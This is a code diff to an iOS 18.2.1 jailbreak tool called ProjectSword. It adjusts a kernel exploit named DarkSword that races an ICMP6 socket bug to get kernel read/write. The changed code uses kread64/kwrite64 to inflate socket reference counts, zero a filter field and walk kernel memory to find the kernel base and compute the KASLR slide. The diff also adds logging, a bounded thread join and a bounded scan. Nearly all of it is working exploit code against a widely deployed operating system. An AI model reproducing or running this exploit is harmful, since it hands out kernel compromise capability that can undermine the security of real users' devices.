@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <unistd.h>
 #include <mach/mach.h>
 #include <mach/mach_time.h>
@@ -1524,37 +1525,81 @@ bool run_darksword(void) {
 
     printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
     printf("[+] successReadCount: %d\n", successReadCount);
+    fflush(stdout);
 
     goSync = 0; raceSync = 1;
-    pthread_join(freeThread, NULL);
+    // Drain the OOB race thread with a bounded wait, then detach. pthread_join
+    // can block the main thread forever if free_thread is stuck in a kernel
+    // wait (observed: app watchdog-killed after the exploit step, then its
+    // corrupted sockets closed on process exit -> kfree -> panic). KRW no
+    // longer needs free_thread, so never block on it.
+    struct timespec tsJoin = {0, 50 * 1000 * 1000};
+    bool joined = false;
+    for (int i = 0; i < 200; i++) {
+        if (pthread_tryjoin_np(freeThread, NULL) == 0) { joined = true; break; }
+        nanosleep(&tsJoin, NULL);
+    }
+    if (!joined) pthread_detach(freeThread);
+    printf("[+] free thread %s\n", joined ? "joined" : "detached");
+    fflush(stdout);
     close(writeFd); close(readFd);
+    printf("[+] race fds closed\n");
+    fflush(stdout);
 
     uint64_t csa = gControlSocketAddr;
     uint64_t rsa = gRwSocketAddr;
-    if (!csa || !rsa) return false;
+    if (!csa || !rsa) {
+        printf("[-] validate did not record csa/rsa\n");
+        fflush(stdout);
+        return false;
+    }
 
+    printf("[+] raising so_count (csa=0x%llx rsa=0x%llx)\n", csa, rsa);
+    fflush(stdout);
     kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
         kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
     kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
         kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
     kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
+    printf("[+] so_count raised, icmp6filt+8 zeroed\n");
+    fflush(stdout);
 
     // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified)
     uint64_t pcbinfo = kread64(controlSocketPcb + 0x38);
     uint64_t ipiZone = kread64(pcbinfo + 0x68);
     uint64_t zvName = kread64(ipiZone + 0x10);
+    printf("[+] pcbinfo 0x%llx ipiZone 0x%llx zvName 0x%llx\n", pcbinfo, ipiZone, zvName);
+    fflush(stdout);
+
     uint64_t kb = zvName & 0xFFFFFFFFFFFFC000;
+    uint64_t kbIter = 0;
+    bool kbFound = false;
     while (1) {
         uint64_t magic = kread64(kb);
         if (magic == 0x100000cfeedfacf) {
             uint64_t hdr = kread64(kb + 8);
-            if (hdr == 0xc00000002 || hdr == 0xb00000000) break;
+            if (hdr == 0xc00000002 || hdr == 0xb00000000) { kbFound = true; break; }
         }
         kb -= PAGE_SIZE;
+        kbIter++;
+        if ((kbIter & 0x1FFF) == 0) {
+            printf("[+] kb scan: kb=0x%llx iter=%llu\n", kb, kbIter);
+            fflush(stdout);
+        }
+        // Bound the walk: a valid zvName is inside the kernel image so the walk
+        // reaches the base within a few MB. Anything past this is garbage and
+        // would otherwise spin forever over mapped heap (observed hang).
+        if (kb < 0xfffffff000000000ULL || kbIter > 0x400000ULL) break;
+    }
+    if (!kbFound) {
+        printf("[-] kernel base walk failed (kb=0x%llx iter=%llu)\n", kb, kbIter);
+        fflush(stdout);
+        return false;
     }
     gKernelBase = kb;
     gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
     printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);
+    fflush(stdout);
 
     free(rBuf); free(wBuf);
     return true;
@@ -2138,6 +2183,9 @@ bool remount_private_preboot(void) {
 
 void run_jailbreak(void) {
     @autoreleasepool {
+        // stdout is a pipe to os_log; make it unbuffered so every printf shows
+        // up immediately in the syslog (a hang otherwise hides all progress).
+        setvbuf(stdout, NULL, _IONBF, 0);
         printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");
 
         // Phase 1: DarkSword ICMP6 kernel exploit
